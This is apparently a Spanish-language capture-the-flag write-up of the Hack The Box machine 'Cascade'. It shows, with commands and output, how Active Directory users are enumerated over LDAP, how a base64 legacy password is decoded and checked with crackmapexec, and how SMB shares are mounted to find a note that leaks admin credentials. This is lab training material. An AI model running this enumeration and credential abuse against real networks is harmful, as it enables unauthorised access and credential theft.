---
layout: post
title:  "Maquina Retirada Cascade AD de Hack The Box (Necesario VIP)"
description: En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada CASCADE AD
tags: HTB, LDAP, RPCCLIENT, ASREPRoast Attack, Maquinas Retiradas,
---

# Cascade - AD Path ~ Hack The Box

Realizamos el Primer escaneo con Nmap
```bash
$" nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allports 10.10.10.182       "
``` 

Procedemos con el siguiente escaneo de Nmap

```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-01-10 18:48:00Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-01-10T18:48:54
|_  start_date: 2022-01-10T14:55:16
```
Procedemos a enumerar los servicios tipicos encontrados como `SMB` y vemos que no tenemos recursos compartidos si proporcionar Contraseña
```bash
smbmap -H 10.10.10.182  
[+] IP: 10.10.10.182:445        Name: cascade.local
```
Procedemos a añadir al archivito `nano /etc/hosts` el `Dominio: cascade.local` 

Procedemos a listar con `Crackmapexec` informacion sobre el equipo que nos enfrentamos
```bash
crackmapexec smb 10.10.10.182                          
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)          
```

Procedemos a enumerar el servicio de `Ldap` atraves de uno de los scripts de `nmap`
```bash
nmap -n --script "ldap* and not brute" -oN ldapScan 10.10.10.182
```

Otra forma y la mas habitual es usando `ldapsearch`:
```bash
ldapsearch -x -h 10.10.10.182 -b 'DC=cascade,DC=local' 
```
Como vemos que se nos lista muchisima informacion procedemos a grepear por el `@ Dominio de la Maquina` para enumerar posibles usuarios a nivel del sistema.

```bash
ldapsearch -x -h 10.10.10.182 -b 'DC=cascade,DC=local' | grep "@cascade.local"

userPrincipalName: CascGuest@cascade.local
userPrincipalName: arksvc@cascade.local
userPrincipalName: s.smith@cascade.local
userPrincipalName: r.thompson@cascade.local
userPrincipalName: util@cascade.local
userPrincipalName: j.wakefield@cascade.local
userPrincipalName: s.hickson@cascade.local
userPrincipalName: j.goodhand@cascade.local
userPrincipalName: a.turnbull@cascade.local
userPrincipalName: e.crowe@cascade.local
userPrincipalName: b.hanson@cascade.local
userPrincipalName: d.burman@cascade.local
userPrincipalName: BackupSvc@cascade.local
userPrincipalName: j.allen@cascade.local
userPrincipalName: i.croft@cascade.local
```

Ahi tenemos unos potenciales usuarios a nivel de sistema para montarnos un diccionario y para intentar hacer un `ASREP-Roasting Attack`

Procedemos a intentar listar un poco de informacion para cada usuario atraves de `ldapsearch` grepeando por el dominio ` -A 20 `

```bash
ldapsearch -x -h 10.10.10.182 -b 'DC=cascade,DC=local' | grep "@cascade.local" -A 20
......
userPrincipalName: "r.thompson"@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132863135972508376
msDS-SupportedEncryptionTypes: 0
"cascadeLegacyPwd:  "   --> Pwd ?¿ Password ?¿ 
......
```

Encontramos fijandonos con nuestro Ojo de Lince una cadena en base64 que podria ser una `Password` para el Usuario `r.thompson` 
```bash
echo "clk0bjVldmE=" | base64 -d                                                                                                 
"rY4n5eva"  --> Password 
```

Procedemos a chequear con crackmapexec la password para el user r.thompson
```bash
crackmapexec smb 10.10.10.182 -u r.thompson -p rY4n5eva                                                                                 
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva
```

Chequeamos para ver si con `winrm` : 
```bash
crackmapexec winrm 10.10.10.182 -u r.thompson -p rY4n5eva                                                                         
WINRM       10.10.10.182    5985   CASC-DC1         [*] Windows 6.1 Build 7601 (name:CASC-DC1) (domain:cascade.local)
WINRM       10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
WINRM       10.10.10.182    5985   CASC-DC1         [-] cascade.local\r.thompson:rY4n5eva
```

Vemos que el usuario `r.thompson` no pertenece al grupo de `Remote Managment System`
Procedemos a listar Recursos compartidos para el usuario `r.thompson` a nivel de `SMB`

```bash
smbmap -H 10.10.10.182  -u r.thompson  -p rY4n5eva                                                      

[+] IP: 10.10.10.182:445        Name: cascade.local                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Audit$                                                  NO ACCESS
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        print$                                                  READ ONLY       Printer Drivers
        SYSVOL                                                  READ ONLY       Logon server share
```

Vemos que tenemos los Permisos de lectura para `Data, NETLOGON, print$, SYSVOL` ... 
Usamos la tool `smbclient` para listar el Recurso en `Data`
```bash
smbclient //10.10.10.182/Data -U 'r.thompson%rY4n5eva'                                                                                                  
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jan 27 04:27:34 2020
  ..                                  D        0  Mon Jan 27 04:27:34 2020
  Contractors                         D        0  Mon Jan 13 02:45:11 2020
  Finance                             D        0  Mon Jan 13 02:45:06 2020
  IT                                  D        0  Tue Jan 28 19:04:51 2020
  Production                          D        0  Mon Jan 13 02:45:18 2020
  Temps                               D        0  Mon Jan 13 02:45:15 2020
```

Encontramos diferentes Directorios .. asique procedemos a crearnos una montura en un directorio que vamos a crear llamado `mnt` para 
listar toda la informcion o data de manera mas comoda.

Creando la montura con `cifs -t` en el directorio `/mnt/` con `-o` le pasamos el nombre de usuario, la password, el dominio y le decimos con permisos de R y W (lectura y Escritura)  
```bash
mount -t cifs //10.10.10.182/Data /mnt/ -o username=r.thompson,password=rY4n5eva,domain=casscade.local,rw
```

Una vez montada la montura, procedemos a listar todo el contenido con el commando `TREE`:

```bash
tree /mnt                                                                                                                                                    

/mnt
├── Contractors
├── Finance
├── IT
│   ├── Email Archives
│   │   └── Meeting_Notes_June_2018.html
│   ├── LogonAudit
│   ├── Logs
│   │   ├── Ark AD Recycle Bin
│   │   │   └── ArkAdRecycleBin.log
│   │   └── DCs
│   │       └── dcdiag.log
│   └── Temp
│       ├── r.thompson
│       └── s.smith
│           └── VNC Install.reg
├── Production
└── Temps
```

Vemos que en el archivo `Meetin_Notes_June_2018_html` encontramos cierta informacion sensible
```bash
<p>-- We will be using a temporary account to
perform all tasks related to the network migration and this account will be deleted at the end of
2018 once the migration is complete. This will allow us to identify actions
related to the migration in security logs etc. "Username is TempAdmin (password is the same as the normal admin account password)." </p>
```

